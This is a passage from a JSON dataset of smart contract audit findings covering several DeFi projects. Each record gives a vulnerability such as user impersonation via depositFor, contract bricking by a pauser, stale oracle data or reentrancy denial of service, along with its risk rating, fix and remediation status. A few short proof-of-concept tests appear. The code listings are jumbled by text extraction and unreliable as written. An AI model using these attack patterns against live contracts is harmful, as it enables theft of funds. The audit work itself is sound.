FLTKStaking contract. 2. She calls stakingtoken.approve(address(FLTKStaking), 10e18) func- tion to increase allowance. 3. She stakes 3e18 Staking Tokens and decides not to stake the other portion of the contract. 4. Bob calls depositFor(address(Alice), 7e18) function with the given parameters. 5. As a result, Alices Staking Tokens will be deposited into FLTKStaking contract. Proof of Concept: Listing 12: FLTKStaking.t.sol - Test Case vm . startPrank ( user1 ); stakingToken . increaseAllowance ( address ( fltkStaking ) , 10 e18 ); fltkStaking . deposit (3 e18 ); skip (1) ; vm . stopPrank () ; 1 function test_depositForSomeoneElse () public { 2 3 4 5 6 7 8 9 10 11 } vm . startPrank ( user2 ); fltkStaking . depositFor ( address ( user1 ) , 7 e18 ); vm . stopPrank () ; 27 Screenshots: Code Location: Listing 13: FLTKStaking.sol (Line 175) 175 function depositFor ( address _user , uint256 _amount ) external  impersonateUser ( _user ) returns ( uint256 ) { 176 177 } return deposit ( _amount ); Listing 14: FLTKStaking.sol (Line 372) 371 modifier impersonateUser ( address _user ) { 372 373 374 375 } _userContext = _user ; _; _userContext = address (0) ; 28 Risk Level: Likelihood - 4 Impact - 2 Recommendation: It is suggested to remove the dangerous impersonateUser modifier and depositFor() function to prevent this attack to occur. Remediation Plan: SOLVED: The Floin team solved the issue by removing the depositFor func- tion from their contract to solve this finding. Commit ID: 5af6890d9dd9513c759541428ecbc2cd88ac6f56 29 ", "labels": ["Halborn", "Floin_Floins", "Severity: Medium"]}, {"title": "LATESTROUNDDATA MIGHT RETURN STALE RESULTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Across these contracts, Chainlinks latestrounddata API is being used. However, there is only a check on updatedAt variable. This could lead to stale prices according to the Chainlink documentation:  getrounddata-return-values Code Location: Listing 15: Crowdsale.sol (Line 179) ( /* uint80 roundId */ , int256 answer , /* uint256 startedAt */ , /* uint256 updatedAt */ , /* uint80 answeredInRound */ ) = priceFeed . latestRoundData () ; 177 function getLatestPrice () public view returns ( int ) { 178 179 180 181 182 183 184 185 186 187 188 189 190 } 191 return answer ; Risk Level: Likelihood - 2 Impact - 3 30 Recommendation: It is recommended to apply following checks too: Listing 16: additional checks 1 require ( answeredInRound >= roundID , \" stale price \" ); 2 require ( updatedAt > 0, \" incomplete round \"); Remediation Plan: SOLVED: The Floin team solved the issue by applying the above recommen- dation to solve this finding. Commit ID: db6bd3edb7802165d8f934e2a0cac7bce5bb4bed 31 ", "labels": ["Halborn", "Floin_Floins", "Severity: Low"]}, {"title": "INCOMPATIBILITY WITH TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some ERC20 tokens make modifications to the standard implementations of their ERC20s transfer or balanceOf functions. One type of such token is deflationary tokens that charge a fee on every transfer() and transferFrom(). The protocol does not have incompatibility with fee-on-transfer tokens. When repaying debt to the treasury, the pre-fee amount is deducted, but the received amount might be lesser. As a result, token transfers for these assets may fail silently. It is mostly a problem for FLTKStaking contract since the users are expected to get exact amount at stake during withdraw() call. The deposit() call will update user stakes with the exact amount as well. Code Location: Listing 17: FLTKStaking.sol (Lines 163,165) 148 function deposit ( uint256 _amount ) public returns ( uint256 ) { 149 require ( _amount > 0, \" FLTKStaking :: deposit : Amount cannot be 0  \" ); 150 151 152 address _userAddress = _getUser () ; uint256 userDepositId = block . timestamp / depositBucketSize *  depositBucketSize ; 153 UserDeposit storage user = userDeposit [ _userAddress ][  userDepositId ]; 154 155 156 157 158 159 uint256 [] memory _depositIds = new uint256 [](1) ; _depositIds [0] = userDepositId ; if ( user . rewardDebt == 0) { depositIds [ _userAddress ]. push ( userDepositId ); } 32 160 161 162 163 updatePoolRewards () ; _saveRewards ( _depositIds ); stakingToken . safeTransferFrom ( _userAddress , address ( this ) ,  _amount ); 164 165 166 167 168 169 } user . amount += _amount ; user . rewardDebt = user . amount * accTokenPerShare / UNITS ; emit Deposit ( _userAddress , userDepositId , _amount ); return userDepositId ; Risk Level: Likelihood - 2 Impact - 3 Recommendation: If support for fee-on-transfer tokens is desired, consider tracking bal- ances before and after the transfer to compute the actual received amount. Remediation Plan: RISK ACCEPTED: The Floin team accepted the risk of this finding as they will not be using any fee-on-transfer tokens in their protocol. 33 ", "labels": ["Halborn", "Floin_Floins", "Severity: Low"]}, {"title": "CENTRALIZED FUNCTIONALITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was determined that the setInitiator function of Crowdsale function is a centralized function. With this function, the contract owner can decide who can participate in Crowdsale earlier than other users in the protocol. It is a good practice to decentralized contract governance by avoiding excessive use of centralized functions. Code Location: Listing 18: Crowdsale.sol (Line 155) 153 function setInitiator ( address address_ , bool allowed ) public  onlyOwner { 154 require ( initiatorWhitelist [ address_ ] != allowed , \" Crowdsale ::  setInitiator : Already set \" ); 155 156 } initiatorWhitelist [ address_ ] = allowed ; Risk Level: Likelihood - 2 Impact - 2 34 Recommendation: Consider removing the setInitiator function to avoid centralization prob- lems. Remediation Plan: RISK ACCEPTED: The Floin team accepted the risk as the finding will only pose a risk if the Owner address is compromised. 35 ", "labels": ["Halborn", "Floin_Floins", "Severity: Low"]}, {"title": "A PAUSER CAN BRICK CROWDSALE CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "A malicious or compromised Pauser can call pause() and renouncePauser() to brick the contract and all assets can be frozen in the Crowdsale contract. Proof of Concept: Listing 19: Crowdsale.t.sol - Test Case vm . startPrank ( deployer ); crowdsale . pause () ; crowdsale . renounceOwnership () ; vm . stopPrank () ; 1 function test_pauserCanBrickContractPoC () public { 2 3 4 5 6 7 8 9 10 11 } vm . startPrank ( user1 ); mockUSDT . approve ( address ( crowdsale ) , 100 e6 ); crowdsale . buyTokens (1 e18 , address (0) ) ; vm . stopPrank () ; Screenshots: 36 Code Location: Listing 20: Crowdsale.sol (Line 13) 13 contract Crowdsale is Ownable , Pausable { Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider overriding renouncePauser function to prevent renouncing address to address(0). Furthermore, transferOwnership() function is not recom- mended to use. A two-Step Ownership Change pattern should be followed. (HAL-10) LACK OF TWO-STEP OWNERSHIP PATTERN finding for more Check: information. Remediation Plan: SOLVED: The Floin team solved the issue by implementing the Ownable2Step library as Access Control and overriding the renounceOwnership() function. Commit ID: a93f8e0bfefb338f5efe62d2540794ba5878eeac 37 3.10 (HAL-10) LACK OF TWO-STEP OWNERSHIP PATTERN - LOW ", "labels": ["Halborn", "Floin_Floins", "Severity: Informational"]}, {"title": "DENIAL OF SERVICE CAUSED BY NONREENTRANT MODIFIER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The following functions contain the nonReentrant modifier: - HighStreetPoolBase.stake() - HighStreetPoolBase.unstake() - HighStreetPoolBase.updateStakeLock() - HighStreetPoolBase.processRewards() - HighStreetCorePool.transferHighToken() - HighStreetCorePool.transferHighTokenFrom() When receiveVaultRewards() function is called the pendingVaultRewards of the stakers will be always different from 0. In this case, when HighStreetPoolBase.unstake() is called, the flow below will be executed: 1. HighStreetPoolBase.unstake() (nonReentrant) 2. ---- HighStreetCorePool._unstake() 3. -------- HighStreetPoolBase._unstake() 4. ------------ HighStreetPoolBase._sync() 5. ------------ HighStreetCorePool._processRewards() 6. ---------------- HighStreetCorePool._processVaultRewards() 7. -------------------- (nonReentrant again) HighStreetCorePool.transferHighToken() As we can see, in this case, HighStreetCorePool.transferHighToken() will be called by HighStreetPoolBase.unstake(), which is not possible as This only happens when both functions got the nonReentrant modifier. pendingVaultRewards > 0 as per the code below: Listing 1: HighStreetCorePool.sol (Lines 275) 258 function _processVaultRewards ( address _staker ) private { 259 User storage user = users [ _staker ]; 14 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 } uint256 pendingVaultClaim = pendingVaultRewards ( _staker ); if ( pendingVaultClaim == 0) return ; // read HIGH token balance of the pool via standard ERC20 interface uint256 highBalance = IERC20 ( HIGH ). balanceOf ( address ( this )); require ( highBalance >= pendingVaultClaim , \" contract HIGH balance too low \" ); // update ` poolTokenReserve ` only if this is a HIGH Core Pool if ( poolToken == HIGH ) { // protects against rounding errors poolTokenReserve -= pendingVaultClaim > poolTokenReserve ? poolTokenReserve : pendingVaultClaim ; } user . subVaultRewards = weightToReward ( user . totalWeight , vaultRewardsPerWeight ); // transfer fails if pool HIGH balance is not enough - which is a desired behavior transferHighToken ( _staker , pendingVaultClaim ); emit VaultRewardsClaimed ( msg . sender , _staker , pendingVaultClaim ); This would cause every single call to HighStreetPoolBase.unstake() to revert with the following error message: ReentrancyGuard: reentrant call Risk Level: Likelihood - 5 Impact - 5 Recommendation: to is remove recommended the It is HighStreetCorePool.transferHighToken() recommended for the HighStreetCorePool.transferHighTokenFrom() function. Both functions are internal. nonReentrant function. modifier The from same the 15 Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID ffef2b7402a0e5308b8019727688a242a220443e 16 ", "labels": ["Halborn", "HighStreetMarket_Staking", "Severity: High"]}, {"title": "SUBVAULTREWARDS ARE NOT UPDATED CORRECTLY WHEN CALLING PROCESSREWARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the HighStreetCorePool contract, the function receiveVaultRewards() is executed by the vault to transfer vault rewards HIGH from the vault into the pool. The function processRewards() and _processVaultRewards() handle the distribution of these rewards but this is not done correctly, and the users are sent a higher amount of reward tokens than the initial amount sent by the vault to the pool. This causes that the smart contract eventually gets a lower reward token balance that what it actually should not allow users to unstake as the balance of the contract is not enough to transfer the users their reward tokens. Proof of Concept: 17 As we can see, 100 tokens were sent by the vault through the call to receiveVaultRewards() functions, but the total vault rewards that will be given are higher than that. In this case, this will cause that the smart contract will not have enough balance to allow user2 to unstake: Risk Level: Likelihood - 4 Impact - 5 Recommendation: It is recommended to fix the logic in the processRewards() and _processVaultRewards() functions so the stakers are not sent a higher amount of reward tokens than the initial amount sent by the vault to the pool through receiveVaultRewards() function. 18 Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 99c5bf0cc40bc76fce973756a45634dfafaa3e01 19 ", "labels": ["Halborn", "HighStreetMarket_Staking", "Severity: High"]}, {"title": "UNSTAKE FUNCTION CAN BE LOCKED IF TOTALWEIGHT EQUALS TO ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract HighStreetPoolBase contains the following function: Listing 2: HighStreetPoolBase.sol (Lines 565) // update HIGH per block value in factory if required if ( factory . shouldUpdateRatio () ) { factory . updateHighPerBlock () ; } 538 function _sync () internal virtual { 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 return ; return ; } if ( blockNumber () <= lastYieldDistribution ) { } // if locking weight is zero - update only ` // check bound conditions and if these are not met - // exit silently , without emitting an event uint256 endBlock = factory . endBlock () ; if ( lastYieldDistribution >= endBlock ) { 554 555 556 557 558 559 560 561 562 563 564 lastYieldDistribution ` and exit if ( usersLockingWeight == 0) { lastYieldDistribution = uint64 ( blockNumber () ); return ; } // to calculate the reward we need to know how many blocks passed , and reward per block uint256 currentBlock = blockNumber () > endBlock ? endBlock : blockNumber () ; uint256 blocksPassed = currentBlock - lastYieldDistribution ; uint256 highPerBlock = factory . highPerBlock () ; // calculate the reward 20 565 566 567 568 569 570 571 572 573 } uint256 highReward = ( blocksPassed * highPerBlock * weight ) / factory . totalWeight () ; // update rewards per weight and ` lastYieldDistribution ` yieldRewardsPerWeight += rewardToWeight ( highReward , usersLockingWeight ); lastYieldDistribution = uint64 ( currentBlock ); // emit an event emit Synchronized ( msg . sender , yieldRewardsPerWeight , lastYieldDistribution ); If factory.totalWeight() equals to zero, a division by zero occurs and the call reverts. As this _sync() function is called every time by the unstake() function, if this value is zero all the rewards and staked tokens will be locked. This scenario where factory.totalWeight() equals to zero can only occur if all the registered pools are HighStreetFlashPool and if all of them have expired/are disabled. In that case, when the users call the unstake() function to retrieve their staked tokens and their rewards the operation will revert. Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended to modify HighStreetPoolFactory.registerPool() function so it does not allow anyone to add a HighStreetFlashPool unless there is already at least one HighStreetCorePool added. This way, the lock would never be possible, as that scenario where the factory.totalWeight() is zero can only happen if all the registered pools are HighStreetFlashPool. 21 Remediation Plan: SOLVED: The HighStreetMarket team fixed the issue in the following commit IDs:  8f0b49cb90cbad93ed0586e6b05f54bac228e68b HighStreetPoolFactory.changePoolWeight() function can now be called by the owner of the contract or by a pool.  53dff6a43b47cdc21d83bb3b8232cbbc96e238b5 HighStreetMarket team added an emergencyWithdraw() function that will allow users to retrieve their staked tokens and the yield rewards in case that factory.totalWeight() equals to zero. 22 ", "labels": ["Halborn", "HighStreetMarket_Staking", "Severity: Medium"]}, {"title": "UPDATEHIGHPERBLOCK IMPACTS NEGATIVELY ALL THE UNCLAIMED REWARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract HighStreetPoolFactory the function updateHighPerBlock() decreases every blocksPerUpdate the highPerBlock rewards by a 3%. This could result, as shown in the Proof of Concept below, in a user losing a part of his reward by calling unstake() right after the execution of updateHighPerBlock(). Proof of Concept: Based on a HighStreetPoolFactory contract with the following initial parameters: - _highPerBlock = 10_000000000000000000 - _blocksPerUpdate = 50 - endBlockNumber - initBlockNumber = 200 Current yield block: 48/200 contract_poolFactory.highPerBlock() -> 10000000000000000000 contract_HighStreetCorePool_HighPool.pendingYieldRewards(user1.address) -> 479999999999999999999 Call to updateHighPerBlock() - REVERTED: (too frequent) Current yield block: 49/200 contract_poolFactory.highPerBlock() -> 10000000000000000000 contract_HighStreetCorePool_HighPool.pendingYieldRewards(user1.address) -> 489999999999999999999 Call to updateHighPerBlock() - CONFIRMED Current yield block: 50/200 contract_poolFactory.highPerBlock() -> 9700000000000000000 contract_HighStreetCorePool_HighPool.pendingYieldRewards(user1.address) -> 484999999999999999999 23 As we can see, if the user calls unstake in the block 49/200 he will get a higher reward than if he called it in the block 50/200. This happens because when updateHighPerBlock() is called it does not pay out the pending rewards to the users at the previous rate. The difference can be really high as shown in the example below: Based on a HighStreetPoolFactory contract with the following initial parameters: - _highPerBlock = 10_000000000000000000 - _blocksPerUpdate = 1 - endBlockNumber - initBlockNumber = 40 Amount of reward tokens received by the user if he just calls unstake() after reaching endBlockNumber: 118284914959653117599 Amount of reward tokens received by the user after calling 40 times processRewards() generating 40 deposits and after retrieving those 40 deposits by calling unstake(): 1227719693740947062768 Difference: 227719693740947062768 - 118284914959653117599 = 109434778781293945169 = 109 reward tokens. Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to loop through the users generating a deposit with the previous rate that they can use to unstake the rewards at the previous rate. Although this solution may eventually require a lot of gas reaching the block gas limit and totally blocking the updateHighPerBlock() function. 24 Remediation Plan: SOLVED: The HighStreetMarket team will mitigate this issue by: - Incentivating their users to claim the rewards more frequently to maximize their profit by compound mechanism. - Creating a script that executes automatically once before each updateHighPerBlock() call. This script will trigger the sync() function updating the yieldRewardsPerWeigh variable. 25 ", "labels": ["Halborn", "HighStreetMarket_Staking", "Severity: Medium"]}, {"title": "MISSING REQUIRE STATEMENT IN UPDATESTAKELOCK FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract HighStreetPoolBase the function updateStakeLock() allows a user to extend the locking period for a given deposit. This function does not check that the tokenAmount is different from zero allowing users to extend deposits that were already unstaked, which makes no sense: Code Location: Listing 3: HighStreetPoolBase.sol uint256 depositId , uint64 lockedUntil 307 function updateStakeLock ( 308 309 310 ) external nonReentrant { 311 312 313 314 315 316 } // sync and call processRewards _sync () ; _processRewards ( msg . sender , false ); // delegate call to an internal function _updateStakeLock ( msg . sender , depositId , lockedUntil ); Risk Level: Likelihood - 2 Impact - 2 26 Recommendation: It is recommended to add a require statement in the updateStakeLock() function that checks that the tokenAmount in the deposit is > 0. Remediation Plan: SOLVED: The HighStreetMarket team fixed the issue in the commit ID f2562ad8f6e8cc39eb1ec17471368e7058b0df92 27 ", "labels": ["Halborn", "HighStreetMarket_Staking", "Severity: Low"]}, {"title": "USERS CAN STAKE IN A FLASHPOOL EVEN IF THE POOL IS DISABLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract HighStreetFlashPool allows user to stake tokens even if the This makes no sense as the users will not get any pool is disabled. reward for staking their tokens in a disabled HighStreetFlashPool. Code Location: Listing 4: HighStreetFlashPool.sol address _staker , uint256 _amount , uint64 _lockedUntil 73 function _stake ( 74 75 76 77 ) internal override { 78 79 // override the ` _lockedUntil ` and execute parent // we set \" locked period \" to 365 days only to have correct calculation of locking weights , 80 // the tokens are not really locked since _unstake in the core pool doesn 't check the \" locked period \" super . _stake ( _staker , _amount , uint64 ( now256 () + 365 days )); 81 82 } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to not allow staking if the HighStreetFlashPool is disabled: 28 Listing 5: HighStreetFlashPool.sol (Lines 78) address _staker , uint256 _amount , uint64 _lockedUntil 73 function _stake ( 74 75 76 77 ) internal override { 78 79 80 require (! isPoolDisabled () , \" Pool disabled \"); // override the ` _lockedUntil ` and execute parent // we set \" locked period \" to 365 days only to have correct calculation of locking weights , 81 // the tokens are not really locked since _unstake in the core pool doesn 't check the \" locked period \" super . _stake ( _staker , _amount , uint64 ( now256 () + 365 days )); 82 83 } Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID dc058f113a6009585f7a47280c9b5cf2930a087b 29 ", "labels": ["Halborn", "HighStreetMarket_Staking", "Severity: Low"]}, {"title": "INCORRECT AMOUNT IN STAKED EVENT EMISSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract HighStreetPoolBase the event Stake will emit a wrong amount in case that the tokens staked are deflationary. Code Location: Listing 6: HighStreetPoolBase.sol (Lines 462) address _staker , uint256 _amount , uint64 _lockUntil 394 function _stake ( 395 396 397 398 ) internal virtual { 399 400 401 402 // validate the inputs require ( _amount > 0, \" zero amount \"); require ( _lockUntil == 0 || ( _lockUntil > now256 () && _lockUntil - 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 now256 () <= 365 days ) , \" invalid lock interval \" ); // update smart contract state _sync () ; // get a link to user data struct , we will write to it later User storage user = users [ _staker ]; // process current pending rewards if any if ( user . tokenAmount > 0) { _processRewards ( _staker , false ); } // in most of the cases added amount ` addedAmount ` is simply ` _amount ` // however for deflationary tokens this can be different // read the current balance 30 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 uint256 previousBalance = IERC20 ( poolToken ). balanceOf ( address ( this )); // transfer ` _amount `; note : some tokens may get burnt here transferPoolTokenFrom ( msg . sender , address ( this ) , _amount ); // read new balance , usually this is just the difference ` previousBalance - _amount ` uint256 newBalance = IERC20 ( poolToken ). balanceOf ( address ( this ) ); // calculate real amount taking into account deflation uint256 addedAmount = newBalance - previousBalance ; // set the ` lockFrom ` and ` lockUntil ` taking into account that // zero value for ` _lockUntil ` means \" no locking \" and leads to zero values // for both ` lockFrom ` and ` lockUntil ` uint64 lockFrom = _lockUntil > 0 ? uint64 ( now256 () ) : 0; uint64 lockUntil = _lockUntil ; // stake weight formula rewards for locking uint256 stakeWeight = ((( lockUntil - lockFrom ) * WEIGHT_MULTIPLIER ) / 365 days + WEIGHT_MULTIPLIER ) * addedAmount ; // makes sure stakeWeight is valid require ( stakeWeight > 0, \" invalid stakeWeight \"); // create and save the deposit ( append it to deposits array ) Deposit memory deposit = Deposit ({ tokenAmount : addedAmount , weight : stakeWeight , lockedFrom : lockFrom , lockedUntil : lockUntil , isYield : false }) ; // deposit ID is an index of the deposit in ` deposits ` array user . deposits . push ( deposit ); // update user record user . tokenAmount += addedAmount ; user . totalWeight += stakeWeight ; user . subYieldRewards = weightToReward ( user . totalWeight , yieldRewardsPerWeight ); 31 458 459 460 461 462 463 } // update global variable usersLockingWeight += stakeWeight ; // emit an event emit Staked ( msg . sender , _staker , _amount ); Risk Level: Likelihood - 3 Impact - 1 Recommendation: It is recommended to use addedAmount instead of _amount: Listing 7 1 emit Staked ( msg . sender , _staker , addedAmount ); Remediation Plan: SOLVED: The HighStreetMarket team fixed the issue in the commit ID 3255a48e93ce0558de9ba33651f943b8f83b6b9f 32 ", "labels": ["Halborn", "HighStreetMarket_Staking", "Severity: Low"]}, {"title": "SOLC 0.8.0 COMPILER VERSION CONTAINS MULTIPLE BUGS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Solidity compiler version 0.8.3, 0.8.4 and 0.8.9 fixed important bugs in the compiler. The version 0.8.0 is missing all these fixes:  0.8.3  0.8.4  0.8.9 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the most tested and stable versions, such as 0.6.12 or 0.7.6. Otherwise, if ^0.8.0 is still chosen to be used because of the new functionality it provides, it is recommended to use 0.8.10 version. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID ec469c0e14949a991a5383ed836ba7dbf5534a7a 33 ", "labels": ["Halborn", "HighStreetMarket_Staking", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: HighStreetPoolFactory.sol - getPoolData() (HighStreetPoolFactory.sol#169-183) - registerPool() (HighStreetPoolFactory.sol#209-227) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce gas costs. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID c31e617d3aec0115855a50c8b39b8e31fbabe7c4 34 3.10 (HAL-10) UINT32/UINT64 TYPES ARE LESS GAS EFFICIENT - INFORMATIONAL ", "labels": ["Halborn", "HighStreetMarket_Staking", "Severity: Informational"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Jarvis_AerariumMilitare_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "JARVIS contract uses the floating pragma ^8.0.0. Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Reference: ConsenSys Diligence - Lock pragmas Code Location: AerariumMilitare.sol Line #3 Reference: ConsenSys Diligence - Lock pragmas Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider locking the pragma version. It is not recommended to use floating pragma in production. Apart from just locking the pragma version in the code, the sign (^) need to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or 12 in hardhat.config.js for HardHat framework. Remediation Plan: RISK ACCEPTED: Jarvis fixed the pragma version in truffle-config. 13 ", "labels": ["Halborn", "Jarvis_AerariumMilitare", "Severity: Low"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Jarvis_AerariumMilitare_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The JARVIS contract uses one of the latest pragma version (0.8.0) which was released Dec 16, 2020. The latest pragma version is (0.8.4) and it was released April 2021. Many pragma versions have been released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases Code Location: AerariumMilitare.sol Line #3 Risk Level: Likelihood - 1 Impact - 2 Recommendation: In the Solitidy Github repository, there is a json file listing the bugs reported for each compiler version. No bugs have been found in > 0.7.3 versions and very few in 0.7.0 -- 0.7.3. The latest stable version is Furthermore, pragma 0.6.12 is widely used by Solidity pragma 0.6.12. developers and has been extensively tested in many security audits. We recommend using at minimum the latest stable version. 14 Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_ by_version.json Remediation Plan: SOLVED: Jarvis team changed the pragma version to 0.7.3. 15 ", "labels": ["Halborn", "Jarvis_AerariumMilitare", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Jarvis_AerariumMilitare_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: AerariumMilitare.sol Lines #76, 87 Risk Level: Likelihood - 1 Impact - 1 Recommendation: A Consider declaring external variables instead of public variables. best practice is to use external if expecting a function to only be 16 called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. SOLVED: Jarvis team marked claim() and liquidate() functions as external. 17 3.4 KOVAN TESTING ", "labels": ["Halborn", "Jarvis_AerariumMilitare", "Severity: Informational"]}, {"title": "USAGE OF VULNERABLE CRATES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/StaderLabs_NearX_Staking_Reaudit_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the project uses crates with known vulnerabilities. Code Location: ID RUSTSEC-2020-0071 RUSTSEC-2020-0159 package time chrono Short Description Potential segfault in the time crate Potential segfault in localtime_r invoca- tions Risk Level: Likelihood - 2 Impact - 1 Recommendation: Even if those vulnerable crates cannot impact the underlying application, it is advised to be aware of them and attempt to update them to a no- vulnerable version. Furthermore, it is necessary to set up dependency monitoring to always be alerted when a new vulnerability is disclosed in one of the projects crates. ### Remediation Plan ACKNOWLEDGED: The StaderLabs team acknowledged this finding. 11 THANK YOU FOR CHOOSING", "labels": ["Halborn", "StaderLabs_NearX_Staking_Reaudit_NEAR", "Severity: Informational"]}, {"title": "LACK OF PROPOSAL SANITIZATION COULD HARM USERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Astral_Assembly_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When a new proposal is submitted via the submit_proposal function in the assembly contract, the submitter can introduce a malicious external URL that tricks users into being redirected to a phishing DApp that could steal their funds. It is worth noting that URLs will appear in the official Astroport frontend, so legitimate users will not be aware if those URLs are In addition, unsanitized title and description malicious or not. fields could lead to other web application exploits such as Cross-site scripting. Code Location: Listing 200,206,211,216,224,227) 1: contracts/assembly/src/contract.rs (Lines 199 200 201 202 203 204 205 206 207 // Validate title if title . len () < MIN_TITLE_LENGTH { return Err ( ContractError :: InvalidProposal ( \" Title too short \" . to_string () , )); } if title . len () > MAX_TITLE_LENGTH { return Err ( ContractError :: InvalidProposal (\" Title too long \"  . to_string () )); 208 209 210 211 212 213 } // Validate the description if description . len () < MIN_DESC_LENGTH { return Err ( ContractError :: InvalidProposal ( \" Description too short \" . to_string () , 12 214 215 216 217 218 219 220 221 222 223 224 225 )); } if description . len () > MAX_DESC_LENGTH { return Err ( ContractError :: InvalidProposal ( \" Description too long \" . to_string () , )); } // Validate Link if let Some ( link ) = & link { if link . len () < MIN_LINK_LENGTH { return Err ( ContractError :: InvalidProposal ( \" Link too  short \" . to_string () )) ; } if link . len () > MAX_LINK_LENGTH { 226 227 228 229 230  long \". to_string () )); } } return Err ( ContractError :: InvalidProposal ( \" Link too Risk Level: Likelihood - 3 Impact - 3 Recommendation: If possible, restrict that URLs are submitted to a whitelist of domains. As this may not be feasible due to the nature of the feature, it is rec- ommended to limit the link, title and description fields to alphanumeric characters plus a subset of symbols, or perform XSS validation using Rust libraries such as libinjection. Reference: LibInjections XSS validation function Remediation plan: PARTIALLY SOLVED: URL and character validation measures were implemented in commit 6910dbf80aba668b4788cc7e73efcf16108cef33. However, Astroport. 13 fi stated that the content of the proposal will be carefully HTML-encoded in a future release of the front-end to mitigate any potential XSS vectors not covered by the smart contract sanitization steps. As the front-end is out of scope for this audit scope and therefore the remediation cannot be reviewed, this issue has been marked as \"Partially solved\". 14 ", "labels": ["Halborn", "Astroport_fi_Astral_Assembly_CosmWasm", "Severity: Medium"]}, {"title": "INCONSISTENT XASTRO BLOCK HEIGHT SELECTION", "html_url": 